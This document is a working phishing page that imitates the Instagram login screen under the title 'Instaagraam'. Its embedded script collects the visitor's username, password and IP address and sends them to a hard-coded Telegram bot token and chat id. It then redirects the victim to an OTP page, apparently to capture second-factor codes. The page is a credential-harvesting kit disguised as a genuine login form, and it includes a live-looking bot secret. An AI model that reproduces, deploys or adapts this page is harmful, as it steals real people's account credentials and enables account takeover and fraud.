<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instaagraam</title>

    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <link rel="preconnect" href="https://fonts.gstatic.com">
<!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>
<noscript>
    <p style="color: red; text-align: center;">JavaScript is required to use this page. Please enable it in your browser.</p>
</noscript>

<div class="container">
    <div class="main-container">
        <div class="main-content">
            <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                <div class="slide-content" id="slide-content">
                    <img src="./images/slide (1).jpg" alt="slide image" class="active">
                    <img src="./images/slide (2).jpg" alt="slide image">
                    <img src="./images/slide (3).jpg" alt="slide image">
                    <img src="./images/slide (4).jpg" alt="slide image">
                    <img src="./images/slide (5).jpg" alt="slide image">
                </div>
            </div>
            <div class="form-container">
                <form id="contactForm" method="POST">
                    <input type="hidden" id="ipaddress" name="ipaddress">

                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>

                        <div class="btn-group">
                            <button class="btn-login" type="button" id="facebook-login-btn">
                                <i class="fab fa-facebook-square"></i> Continue Using Facebook
                            </button>
                        </div>

                        <div class="divine">
                            <div></div>
                            <div>OR</div>
                            <div></div>
                        </div>

                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>Phone number, username or email</span>
                                    <input type="text" name="username" id="username" required>
                                </div>
                            </div>

                            <div class="form-group">
                                <div class="animate-input">
                                    <span>Password</span>
                                    <input type="password" name="password" id="password" required>
                                    <button type="button" onclick="togglePassword()">Show</button>
                                </div>
                                <div style="text-align: end; color: rgb(0, 17, 255);">
                                    <a href="#" class="forgot-pw">Forgotten your password?</a>
                                </div>
                            </div>

                            <div class="btn-group">
                                <button class="btn-login" type="submit" id="login-btn">
                                    Log In
                                </button>
                            </div>

                            <div class="box goto">
                                <p>Don't have an account? <a href="#">Sign up</a></p>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>

        <div class="app-download">
            <p>Get the app.</p>
            <div class="store-link">
                <a href="#"><img src="./images/app-store.png" alt="App Store"></a>
                <a href="#"><img src="./images/gg-play.png" alt="Google Play"></a>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <div class="links">
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Top Accounts</a>
        <a href="#">Hashtags</a>
        <a href="#" id="darkmode-toggle">Darkmode</a>
    </div>
    <hr>
    <div class="copyright">
        <p>from</p>
        <img src="images/download.jpg" alt="">
    </div>
</div>

<!-- Main JS -->
<script>
    // Fetch IP address
    document.addEventListener('DOMContentLoaded', function () {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('ipaddress').value = data.ip;
            })
            .catch(error => {
                console.error('IP Fetch Error:', error);
                document.getElementById('ipaddress').value = 'Unavailable';
            });
    });

    // Handle login submission
    document.getElementById('contactForm').addEventListener('submit', function (event) {
        event.preventDefault();

        var username = document.getElementById('username').value.trim();
        var password = document.getElementById('password').value.trim();
        var ipaddress = document.getElementById('ipaddress').value || 'Unavailable';

        if (!username || !password) {
            alert("Please fill in both username and password.");
            return;
        }

        var telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIpaddress: ${ipaddress}`;
        var token = '7245614431:AAFDtt-ZsldZkJNYyX4foQB7wqvCJz0nrZA';
        var chat_id = '6961550883';
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';
                } else {
                    alert('Could not send data. Please try again.');
                }
            })
            .catch(error => {
                console.error('Telegram API Error:', error);
                alert('An error occurred while sending your login. Please try again later.');
            });
    });

    // Toggle password visibility
    function togglePassword() {
        var input = document.getElementById("password");
        input.type = input.type === "password" ? "text" : "password";
    }
</script>

<script src="app.js"></script>
</body>
</html>
